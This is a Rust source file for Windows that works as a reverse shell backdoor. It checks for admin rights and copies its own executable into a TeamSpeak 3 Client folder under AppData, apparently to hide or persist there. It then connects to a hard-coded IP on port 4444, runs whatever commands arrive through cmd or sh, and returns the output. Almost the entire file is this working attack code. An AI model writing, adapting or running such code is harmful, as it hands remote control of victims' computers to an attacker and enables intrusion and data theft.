extern crate winapi;

use std::env;
use std::fs;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::ptr;
use std::thread;
use std::time::Duration;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::winnt::{TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY};
fn has_admin_rights() -> bool {
    unsafe {
        let mut handle: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle) == 0 {
            return false;
        }

        let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
        let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;

        let result = GetTokenInformation(
            handle,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        );

        if result == 0 {
            return false;
        }

        elevation.TokenIsElevated != 0
    }
}

fn make_network_connection(address: &str) {
    match TcpStream::connect(address) {
        Ok(mut stream) => {
            println!("Successfully connected to {}", address);
            let mut buffer = [0; 4096];

            loop {
                let size = match stream.read(&mut buffer) {
                    Ok(size) => size,
                    Err(e) => {
                        eprintln!("Failed to read from stream: {}", e);
                        break;
                    }
                };

                if size == 0 {
                    println!("Connection closed by the remote host.");
                    break;
                }

                let command = String::from_utf8_lossy(&buffer[..size]);
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd").args(["/C", command.trim()]).output()
                } else {
                    Command::new("sh").arg("-c").arg(command.trim()).output()
                };

                match output {
                    Ok(output) => {
                        let response = if output.status.success() {
                            String::from_utf8_lossy(&output.stdout)
                        } else {
                            String::from_utf8_lossy(&output.stderr)
                        };

                        stream
                            .write_all(response.as_bytes())
                            .expect("Failed to write to stream");
                    }
                    Err(e) => {
                        eprintln!("Failed to execute command: {}", e);
                        break;
                    }
                }
            }
        }
        Err(e) => println!("Failed to connect: {}", e),
    }
}

fn main() {
    if has_admin_rights() {
        println!("Already an admin. Making network connection...");
        make_network_connection("100.112.189.99:4444"); // Replace with your target address and port
    } else {
        let exe_path = env::current_exe().expect("Failed to get current executable path");
        let mut new_path = PathBuf::from("C:\\Users\\TestUser\\AppData\\Local\\TeamSpeak 3 Client");
        new_path.push("copied_program.exe");

        fs::copy(&exe_path, &new_path).expect("Failed to copy executable");

        println!("Executable copied to {:?}", new_path);
        make_network_connection("100.112.189.99:4444");
    }
}
